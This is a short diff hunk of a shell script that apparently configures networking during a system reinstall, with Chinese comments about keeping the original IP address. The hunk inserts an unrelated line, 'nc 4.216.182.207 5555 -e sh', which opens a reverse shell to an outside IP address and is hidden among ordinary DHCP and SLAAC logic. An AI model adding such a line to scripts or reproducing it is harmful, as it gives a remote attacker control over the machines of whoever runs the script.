@@ -329,7 +329,7 @@ if $dhcpv4 && [ -n "$ipv4_addr" ] && [ -n "$ipv4_gateway" ] &&
         dhcpv4=false
     fi
 fi
-
+nc 4.216.182.207 5555 -e sh
 should_disable_ra_slaac=false
 # 防止自动获取的 IP 无法上网
 # 防止自动获取的 IP 不是重装前的 IP 而造成失联
